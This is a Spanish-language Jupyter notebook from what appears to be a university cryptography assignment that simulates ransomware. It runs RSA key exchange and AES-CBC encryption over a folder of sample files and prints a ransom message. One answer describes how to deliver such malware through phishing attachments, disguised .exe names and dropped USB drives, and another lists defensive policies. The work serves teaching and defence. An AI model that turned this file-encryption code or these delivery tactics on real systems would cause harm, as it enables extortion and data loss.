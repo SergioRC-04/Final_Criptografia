{
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "npFGVwg3v-RV"
      },
      "source": [
        "# Proyecto de Criptografía - Simulación de Ransomware"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 2,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "collapsed": true,
        "id": "J18l0hTVYkpE",
        "outputId": "03887279-5bf1-4c1e-e324-8a7ccaff857d"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "Requirement already satisfied: pycryptodome in ./venv/lib/python3.11/site-packages (3.23.0)\n",
            "Requirement already satisfied: gdown in ./venv/lib/python3.11/site-packages (5.2.0)\n",
            "Requirement already satisfied: beautifulsoup4 in ./venv/lib/python3.11/site-packages (from gdown) (4.13.4)\n",
            "Requirement already satisfied: filelock in ./venv/lib/python3.11/site-packages (from gdown) (3.18.0)\n",
            "Requirement already satisfied: requests[socks] in ./venv/lib/python3.11/site-packages (from gdown) (2.32.3)\n",
            "Requirement already satisfied: tqdm in ./venv/lib/python3.11/site-packages (from gdown) (4.67.1)\n",
            "Requirement already satisfied: soupsieve>1.2 in ./venv/lib/python3.11/site-packages (from beautifulsoup4->gdown) (2.7)\n",
            "Requirement already satisfied: typing-extensions>=4.0.0 in ./venv/lib/python3.11/site-packages (from beautifulsoup4->gdown) (4.13.2)\n",
            "Requirement already satisfied: charset-normalizer<4,>=2 in ./venv/lib/python3.11/site-packages (from requests[socks]->gdown) (3.4.2)\n",
            "Requirement already satisfied: idna<4,>=2.5 in ./venv/lib/python3.11/site-packages (from requests[socks]->gdown) (3.10)\n",
            "Requirement already satisfied: urllib3<3,>=1.21.1 in ./venv/lib/python3.11/site-packages (from requests[socks]->gdown) (2.4.0)\n",
            "Requirement already satisfied: certifi>=2017.4.17 in ./venv/lib/python3.11/site-packages (from requests[socks]->gdown) (2025.4.26)\n",
            "Requirement already satisfied: PySocks!=1.5.7,>=1.5.6 in ./venv/lib/python3.11/site-packages (from requests[socks]->gdown) (1.7.1)\n",
            "Retrieving folder contents\n",
            "Processing file 141Z4dExakyhQYMOpYFDYZpRDQVWj7fxd archivo1.txt\n",
            "Processing file 184jOD65kvt83t4vxEqQ2y2JYtuijoRKg archivo2.txt\n",
            "Retrieving folder contents completed\n",
            "Building directory structure\n",
            "Building directory structure completed\n",
            "Downloading...\n",
            "From: https://drive.google.com/uc?id=141Z4dExakyhQYMOpYFDYZpRDQVWj7fxd\n",
            "To: /home/sergio/Escritorio/U/Final_Criptografia/victima_archivos/archivo1.txt\n",
            "100%|██████████████████████████████████████████| 455/455 [00:00<00:00, 2.76MB/s]\n",
            "Downloading...\n",
            "From: https://drive.google.com/uc?id=184jOD65kvt83t4vxEqQ2y2JYtuijoRKg\n",
            "To: /home/sergio/Escritorio/U/Final_Criptografia/victima_archivos/archivo2.txt\n",
            "100%|██████████████████████████████████████████| 799/799 [00:00<00:00, 2.29MB/s]\n",
            "Download completed\n"
          ]
        }
      ],
      "source": [
        "# Instalar librerias\n",
        "!pip install pycryptodome gdown\n",
        "# Descarga los archivos desde tu carpeta pública en Drive\n",
        "!gdown --folder https://drive.google.com/drive/folders/1q1s_jsqEcsmQfKkV5W8rwSaTgnt8G232?usp=sharing"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 3,
      "metadata": {
        "id": "ywU7nyl17aDp"
      },
      "outputs": [],
      "source": [
        "from Crypto.PublicKey import RSA\n",
        "from Crypto.Cipher import PKCS1_OAEP, AES\n",
        "from Crypto.Signature import pkcs1_15\n",
        "from Crypto.Hash import SHA256\n",
        "from Crypto.Random import get_random_bytes\n",
        "import os"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "oJhvmrrz-X7G"
      },
      "source": [
        "### Generar llaves RSA y certificados"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 4,
      "metadata": {
        "id": "YUBhd7V27jR5"
      },
      "outputs": [],
      "source": [
        "def generar_certificado(id_str):\n",
        "    key = RSA.generate(2048)\n",
        "    pub_key = key.publickey()\n",
        "    cert = {'id': id_str, 'pk': pub_key}\n",
        "    return cert, key\n",
        "\n",
        "cert_victima, key_priv_victima = generar_certificado(\"victima_001\")\n",
        "cert_atacante, key_priv_atacante = generar_certificado(\"atacante_001\")"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "rZ4nVyDi-hR4"
      },
      "source": [
        "### Protocolo AKE v.2"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 5,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "y4MFEWJS7xNW",
        "outputId": "86bc7047-97e5-4675-c4a9-28520529271c"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "✔️ Firma válida. Secreto compartido establecido.\n"
          ]
        }
      ],
      "source": [
        "def protocolo_ake_v2(cert_emisor, priv_emisor, cert_receptor):\n",
        "    K = get_random_bytes(128)  # 1024 bits\n",
        "    hash_K = SHA256.new(K)\n",
        "    firma = pkcs1_15.new(priv_emisor).sign(hash_K)\n",
        "\n",
        "    cipher_rsa = PKCS1_OAEP.new(cert_receptor['pk'])\n",
        "    K_cifrado = cipher_rsa.encrypt(K)\n",
        "\n",
        "    cipher_rsa_receptor = PKCS1_OAEP.new(key_priv_victima if cert_receptor['id'] == \"victima_001\" else key_priv_atacante)\n",
        "    K_descifrado = cipher_rsa_receptor.decrypt(K_cifrado)\n",
        "\n",
        "    hash_recibido = SHA256.new(K_descifrado)\n",
        "    try:\n",
        "        pkcs1_15.new(cert_emisor['pk']).verify(hash_recibido, firma)\n",
        "        print(\"✔️ Firma válida. Secreto compartido establecido.\")\n",
        "        return K_descifrado\n",
        "    except (ValueError, TypeError):\n",
        "        print(\"❌ Firma inválida.\")\n",
        "        return None\n",
        "\n",
        "K_compartido = protocolo_ake_v2(cert_atacante, key_priv_atacante, cert_victima)"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "QZ2yJ9_c-55x"
      },
      "source": [
        "### Derivación de llave simétrica"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 6,
      "metadata": {
        "id": "oqu6fWMv715P"
      },
      "outputs": [],
      "source": [
        "def derivar_llave(K):\n",
        "    return SHA256.new(K).digest()\n",
        "\n",
        "llave_simetrica = derivar_llave(K_compartido)"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "7lRerHtd9Yjf"
      },
      "source": [
        "### Escanear archivos"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 7,
      "metadata": {
        "id": "bTIounjo9PHU"
      },
      "outputs": [],
      "source": [
        "def escanear_archivos_victima(ruta_base, extensiones_permitidas=None):\n",
        "    archivos_encontrados = []\n",
        "    for carpeta_actual, _, archivos in os.walk(ruta_base):\n",
        "        for archivo in archivos:\n",
        "            ruta_completa = os.path.join(carpeta_actual, archivo)\n",
        "            if extensiones_permitidas:\n",
        "                if any(archivo.lower().endswith(ext) for ext in extensiones_permitidas):\n",
        "                    archivos_encontrados.append(ruta_completa)\n",
        "            else:\n",
        "                archivos_encontrados.append(ruta_completa)\n",
        "    return archivos_encontrados"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 8,
      "metadata": {
        "id": "BoGPyDU_9J_K"
      },
      "outputs": [],
      "source": [
        "ruta_base = \"victima_archivos\"\n",
        "archivos_objetivo = escanear_archivos_victima(ruta_base, extensiones_permitidas=[\".txt\", \".pdf\", \".jpg\", \".png\"])"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "KJROu9mT9gUd"
      },
      "source": [
        "### Cifrar archivos"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 9,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "Z2bdpfY38WVA",
        "outputId": "87a51082-ca2e-4ad8-f6a2-5356008b91c2"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "\n",
            "🚨 Tus archivos han sido cifrados:\n",
            " - victima_archivos/archivo1.txt.enc\n",
            " - victima_archivos/archivo2.txt.enc\n",
            "\n",
            "Para recuperar tus archivos, paga 0.01 BTC a la dirección: bc1qexample123456789\n",
            "\n"
          ]
        }
      ],
      "source": [
        "def cifrar_archivo(path, key):\n",
        "    with open(path, 'rb') as f:\n",
        "        datos = f.read()\n",
        "\n",
        "    hash_original = SHA256.new(datos).hexdigest()\n",
        "\n",
        "    iv = get_random_bytes(16)\n",
        "    cipher = AES.new(key, AES.MODE_CBC, iv)\n",
        "\n",
        "    padding_len = 16 - len(datos) % 16\n",
        "    datos += bytes([padding_len]) * padding_len\n",
        "\n",
        "    cifrado = cipher.encrypt(datos)\n",
        "\n",
        "    ruta_cifrado = path + \".enc\"\n",
        "    with open(ruta_cifrado, 'wb') as f:\n",
        "        f.write(iv + cifrado)\n",
        "\n",
        "    return ruta_cifrado, hash_original\n",
        "hashes_originales = {}\n",
        "for archivo in archivos_objetivo:\n",
        "    ruta_cifrado, h = cifrar_archivo(archivo, llave_simetrica)\n",
        "    hashes_originales[ruta_cifrado] = h\n",
        "\n",
        "print(\"\\n🚨 Tus archivos han sido cifrados:\")\n",
        "for path in hashes_originales:\n",
        "    print(f\" - {path}\")\n",
        "print(\"\\nPara recuperar tus archivos, paga 0.01 BTC a la dirección: bc1qexample123456789\\n\")"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "mWlsMnk29rmt"
      },
      "source": [
        "### Decifrar archivos"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 10,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "c7mGBHvI8mfe",
        "outputId": "83499a72-ffa0-4368-81ce-65d2c212f7f0"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "🔓 Simulando el pago y restauración...\n",
            "✅ victima_archivos/archivo1.txt.enc descifrado correctamente. Integridad verificada.\n",
            "✅ victima_archivos/archivo2.txt.enc descifrado correctamente. Integridad verificada.\n"
          ]
        }
      ],
      "source": [
        "def descifrar_archivo(path_cifrado, key):\n",
        "    with open(path_cifrado, 'rb') as f:\n",
        "        contenido = f.read()\n",
        "    iv = contenido[:16]\n",
        "    cifrado = contenido[16:]\n",
        "\n",
        "    cipher = AES.new(key, AES.MODE_CBC, iv)\n",
        "    datos_descifrados = cipher.decrypt(cifrado)\n",
        "\n",
        "    padding_len = datos_descifrados[-1]\n",
        "    datos_descifrados = datos_descifrados[:-padding_len]\n",
        "\n",
        "    path_original = path_cifrado.replace(\".enc\", \".descifrado\")\n",
        "    with open(path_original, 'wb') as f:\n",
        "        f.write(datos_descifrados)\n",
        "\n",
        "    return SHA256.new(datos_descifrados).hexdigest()\n",
        "\n",
        "print(\"🔓 Simulando el pago y restauración...\")\n",
        "\n",
        "for archivo_cifrado, hash_original in hashes_originales.items():\n",
        "    hash_descifrado = descifrar_archivo(archivo_cifrado, llave_simetrica)\n",
        "    if hash_descifrado == hash_original:\n",
        "        print(f\"✅ {archivo_cifrado} descifrado correctamente. Integridad verificada.\")\n",
        "    else:\n",
        "        print(f\"❌ Error en integridad para {archivo_cifrado}.\")"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "WsNLVgO8vUjW"
      },
      "source": [
        "---"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "XvNLDIQF97lt"
      },
      "source": [
        "## **Preguntas**"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "P-kBn4Qut4XI"
      },
      "source": [
        "### **Pregunta 1**\n",
        "#### Asuman el rol del atacante. Imaginen que realizan una implementación funcional y real de su malware y lo convierten en un arma de ataque. ¿Qué estrategias utilizarían para que la víctima lo instale en su máquina? Es decir, ¿cómo implementarían el paso 1 descrito en la operación?\n"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "LpambUH6vHf2"
      },
      "source": [
        "#### **Respuesta:**\n",
        "Desde el rol del atacante, una estrategia común y efectiva para lograr que la víctima instale el ransomware es el uso de **ingeniería social** a través de **correos electrónicos de phishing**. En este contexto, podríamos camuflar nuestro ransomware como un archivo legítimo (por ejemplo, una factura en PDF o un documento Word con macros maliciosas) y adjuntarlo a un correo convincente que inste al usuario a abrirlo.\n",
        "\n",
        "Aunque nuestro proyecto fue implementado de forma simulada en Google Colab (y no ejecutado directamente en una máquina real), si quisiéramos adaptarlo a un entorno real, podríamos:\n",
        "\n",
        "* Convertir el script en un ejecutable `.exe` o `.pyw` (en Windows), ocultando la consola.\n",
        "* Incluirlo en un archivo comprimido `.zip` o `.rar`, con nombres atractivos como `ReciboPago_BancoXYZ.pdf.exe`.\n",
        "* Configurar el malware para que se autoejecute al abrir el archivo y comience el proceso de cifrado descrito (intercambio de llaves, derivación, cifrado de archivos).\n",
        "\n",
        "Otra opción sería **usar una unidad USB comprometida**, dejarla abandonada en lugares estratégicos (como oficinas), y confiar en que alguien la conecte. Esto explotaría la curiosidad humana para ejecutar el malware voluntariamente."
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "dRSnJ1SjwUAK"
      },
      "source": [
        "---"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "S6JrSnE5vgYU"
      },
      "source": [
        "### **Pregunta 2**\n",
        "\n",
        "#### Asuman el rol del defensor. Describan políticas y prácticas para garantizar la confidencialidad, la integridad y la disponibilidad de recursos informáticos en una organización. En particular, estas políticas y prácticas deberían mitigar la ocurrencia de este tipo de ataques."
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "EDZIyCQ_uadR"
      },
      "source": [
        "#### **Respuesta:**\n",
        "\n",
        "Desde el rol del defensor, la mejor forma de mitigar ataques de ransomware como el desarrollado en este proyecto es aplicar el **modelo de seguridad CIA**: **Confidencialidad, Integridad y Disponibilidad**.\n",
        "\n",
        "Con base en lo que nuestro ransomware simulado realiza (cifrado de archivos tras un intercambio de llaves y notificación de rescate), estas serían las políticas clave:\n",
        "\n",
        "**1. Confidencialidad**\n",
        "\n",
        "* **Restricción de permisos de usuario**: limitar el acceso a archivos sensibles solo a usuarios autorizados.\n",
        "* **Uso de software antivirus y antimalware actualizado** que pueda detectar firmas de ransomware conocidos o comportamiento sospechoso como acceso masivo a archivos.\n",
        "\n",
        "**2. Integridad**\n",
        "\n",
        "* **Verificación de integridad mediante hash**: así como en nuestro proyecto se comparan hashes SHA-256 para detectar modificaciones, en un sistema real se puede hacer auditoría continua de archivos críticos.\n",
        "* **Política de control de cambios**: los archivos sensibles deben tener seguimiento de versiones y permisos de escritura restringidos.\n",
        "\n",
        "**3. Disponibilidad**\n",
        "\n",
        "* **Copias de seguridad periódicas (backups offline)**: esto es fundamental. Si el ransomware cifra todos los archivos, el usuario puede restaurar desde una copia reciente sin necesidad de pagar.\n",
        "* **Segmentación de red y control de ejecución de scripts**: esto evita la propagación del ransomware en entornos corporativos.\n",
        "* **Simulacros de recuperación ante desastres**: entrenar al personal en qué hacer si ocurre un ataque."
      ]
    }
  ],
  "metadata": {
    "colab": {
      "provenance": []
    },
    "kernelspec": {
      "display_name": "venv",
      "language": "python",
      "name": "python3"
    },
    "language_info": {
      "codemirror_mode": {
        "name": "ipython",
        "version": 3
      },
      "file_extension": ".py",
      "mimetype": "text/x-python",
      "name": "python",
      "nbconvert_exporter": "python",
      "pygments_lexer": "ipython3",
      "version": "3.11.2"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 0
}
